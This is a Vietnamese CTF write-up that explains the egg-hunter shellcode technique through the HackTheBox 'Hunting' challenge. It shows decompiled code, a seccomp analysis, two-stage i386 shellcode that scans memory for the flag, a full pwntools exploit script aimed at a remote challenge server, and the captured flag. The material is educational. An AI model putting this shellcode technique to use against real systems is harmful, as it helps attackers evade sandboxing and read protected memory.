# Egg Hunter 

- khi ta ko đủ vùng nhớ stack để ghi shellcode, ta liền nghĩ đến kĩ thuật Stack Pivoting, nhưng nếu Pie mở và ta ko leak được địa chỉ nào, ko có bof và ko ow được rbp, ta phải làm sao ?? kĩ thuật Egg Hunter sẽ giúp bạn 
- Khi ta có thể thực thi nhưng chỉ thực thi được với payload nhỏ và không đủ để tạo shell, ta có thể nhập payload chính ở đoạn khác (payload này xem như egg) và dùng payload nhỏ đó để tìm payload chính và trigger thực thi payload chính đó. Vì thế payload nhỏ có thể được xem là kẻ đi săn hunter và payload chính là egg cần tìm, từ đó có tên gọi kỹ thuật là Egg Hunter! 
- đọc thì có vẻ đơn giản đó nên ta làm thử chall dưới để hiểu rõ hơn về kĩ thuật này 

# Hunting

- I've hidden the flag very carefully, you'll never manage to find it! Please note that the goal is to find the flag, and not to obtain a shell. 

## ida 

- **main** 

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-4h] [ebp-18h]
  void *buf; // [esp+0h] [ebp-14h]
  char *dest; // [esp+4h] [ebp-10h]
  void *addr; // [esp+8h] [ebp-Ch]

  addr = (void *)rand_func();
  signal(14, (__sighandler_t)&exit);
  alarm(0xAu);
  dest = (char *)mmap(addr, 0x1000u, 3, 49, -1, 0);
  if ( dest == (char *)-1 )
    sub_1120((int)&off_3FA8);
  strcpy(dest, aHtbXxxxxxxxxxx);
  memset(aHtbXxxxxxxxxxx, 0, sizeof(aHtbXxxxxxxxxxx));
  seccomp();
  buf = mmap(0, 0x1000u, 7, 33, -1, 0);
  read(0, buf, 60u);
  ((void (__stdcall *)(int, void *, _DWORD))buf)(v4, buf, 0);
  return 0;
}
```

- **rand_func** 

```c 
int rand_func()
{
  unsigned int buf; // [esp+0h] [ebp-18h] BYREF
  int fd; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  fd = open("/dev/urandom", 0);
  read(fd, &buf, 8u);
  close(fd);
  srand(buf);
  for ( i = 0; i <= 0x5FFFFFFF; i = rand() << 16 )
    ;
  return i;
}
``` 

- **seccomp** 

```c 
int seccomp()
{
  int result; // eax
  __int16 v1; // [esp+8h] [ebp-10h] BYREF
  char *v2; // [esp+Ch] [ebp-Ch]

  v1 = 14;
  v2 = asc_4060;
  if ( prctl(38, 1, 0, 0, 0) < 0 )
  {
    perror("prctl(PR_SET_NO_NEW_PRIVS)");
    sub_1120((int)&off_3FA8);
  }
  result = prctl(22, 2, &v1);
  if ( result < 0 )
  {
    perror("prctl(PR_SET_SECCOMP)");
    return sub_1120((int)&off_3FA8);
  }
  return result;
}
``` 
![image](https://github.com/gookoosss/CTF/assets/128712571/73312df7-927e-406a-819c-0c6852b11a2f)


## Analysis 
- đọc sơ qua ida vs description là biết đây là chall sử dụng shellcode rồi 
- có seccomp nên ta dùng seccomp-tools xem sao 

![image](https://github.com/gookoosss/CTF/assets/128712571/43dc8950-fc1c-40cb-94d6-851d9410420b)


- hmm ta chỉ sử dụng được 2 syscall read và write 
- có 1 điều khá thú vị là flag đã được lưu trong 1 biến (do trên local nên bị ẩn lại) 

![image](https://github.com/gookoosss/CTF/assets/128712571/bf1673aa-0258-4cdf-8baa-652ce81db47a)


- phân tích hàm rand_func thì ta thấy địa chỉ được rand sẽ lớn hơn 0x5FFFFFFF và bỏ qua 2byte đầu (16bit) => địa chỉ base là 0x60000000 và luôn có 2 byte đầu null
```c
for ( i = 0; i <= 0x5FFFFFFF; i = rand() << 16 )
```
- dest sẽ khởi tạo 1 addr ngẫu nhiên để lưu flag vào => Egg
- buf cũng vậy và ta sẽ được nhập shellcode vào buf 
- vấn đề ở đây là chall chỉ cho phép ta nhập tối đa 60byte, quá ít ko đủ để ta brute tìm addr của dest 
- với việc được sử dụng syscall read cho phép ta nhập lại 1 lần nữa với size tùy chọn , lúc này shellcode sẽ là hunter và đi săn addr Egg là dest 

## Exploit 
- đầu tiên setup syscall read nhập lại 1 lần nữa với size 0x400, may mắn cho ta vì rcx đã có sẵn địa chỉ buf rồi 

```python 
shellcode1 = asm('''
                mov eax , 3
                xor ebx, ebx
                mov edx, 0x400
                int 0x80
                ''', arch = 'i386')
```
- eip tiếp theo sẽ trỏ đến 0x2aa6a00e, mà ecx ta nhập vào 0x2aa6a000 nên ta padding 0xe byte để eip sau khi nhập sẽ trỏ đến shellcode 

![image](https://github.com/gookoosss/CTF/assets/128712571/f40a710b-6d48-48da-b0b7-6ec193eaeda9)

- nhưng phân tích ở trên thì addr base của thằng dest là 0x60000000 nên ta set trước edi = 0x60000000(tránh các thanh ghi quang trọng như ecx, eax, edx, ebx) 

```python 
init:
        mov edi, 0x60000000
``` 
- có 1 điều thú vị mà ta nên biết nếu thực thi syscall write với ecx ko hợp lệ, byte đầu tiên của eax sẽ là 0xf2 


![image](https://github.com/gookoosss/CTF/assets/128712571/1ce7c20e-457e-4396-9700-6c58e911908b)


- lợi dùng điều nay là sẽ filter được các địa chỉ hợp lệ từ 0x60000000 để check flag, hạn chế được thời gian brute force 
- như phân tích ở trên thì addr dest sẽ có 2 byte đầu null nên mỗi lần check nếu ko phải địa chỉ dest thì ta sẽ cộng thêm cho edi 0x10000
```c 
run:
        mov eax, 4       # write
        mov ebx, 1 
        mov ecx, edi
        mov edx, 1
        int 0x80
        cmp al, 0xf2
        je next_page
        jmp check

    next_page:
        add edi, 0x10000
        jmp run
```
- sau khi tìm được địa chỉ hợp lệ ta sẽ check data của nó, như ta đã biết thì flag sẽ bắt đầu bằng 4byte 'HTB{', nếu 4 byte đầu địa chỉ đó đúng như trên, thực thi syscall read để in flag ra 

```c 
check:
        mov al, [edi+0]
        cmp al, 'H'
        jne next_page

        mov al, [edi+1]
        cmp al, 'T'
        jne next_page

        mov al, [edi+2]
        cmp al, 'B'
        jne next_page

        mov al, [edi+3]
        cmp al, '{'
        jne next_page

        mov eax, 4   # read
        mov ebx, 1
        mov ecx, edi
        mov edx, 0x100
        int 0x80
```
- cuối cùng thì ta cũng có được flag 

![image](https://github.com/gookoosss/CTF/assets/128712571/b25cd585-ffb6-4b96-a96b-57214de17ba1)


## script 

```python 
from pwn import *

p = process('./hunting')
p = remote('167.99.82.136', 32212)

# gdb.attach(p, gdbscript = '''
# b*0x5655654a
# c
# ''')

# input()

shellcode1 = asm('''
                mov eax , 3
                xor ebx, ebx
                mov edx, 0x400
                int 0x80
                ''', arch = 'i386')

shellcode2 = asm(
    '''
    init:
        mov edi, 0x60000000
    
    run:
        mov eax, 4
        mov ebx, 1
        mov ecx, edi
        mov edx, 1
        int 0x80
        cmp al, 0xf2
        je next_page
        jmp check

    next_page:
        add edi, 0x10000
        jmp run

    check:
        mov al, [edi+0]
        cmp al, 'H'
        jne next_page

        mov al, [edi+1]
        cmp al, 'T'
        jne next_page

        mov al, [edi+2]
        cmp al, 'B'
        jne next_page

        mov al, [edi+3]
        cmp al, '{'
        jne next_page

        mov eax, 4
        mov ebx, 1
        mov ecx, edi
        mov edx, 0x100
        int 0x80
    ''', arch = 'i386')

p.send(shellcode1.ljust(0x3c, b'P') + b'A'*0xe + shellcode2)
p.interactive()

# HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}
``` 

## Flag 

HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}
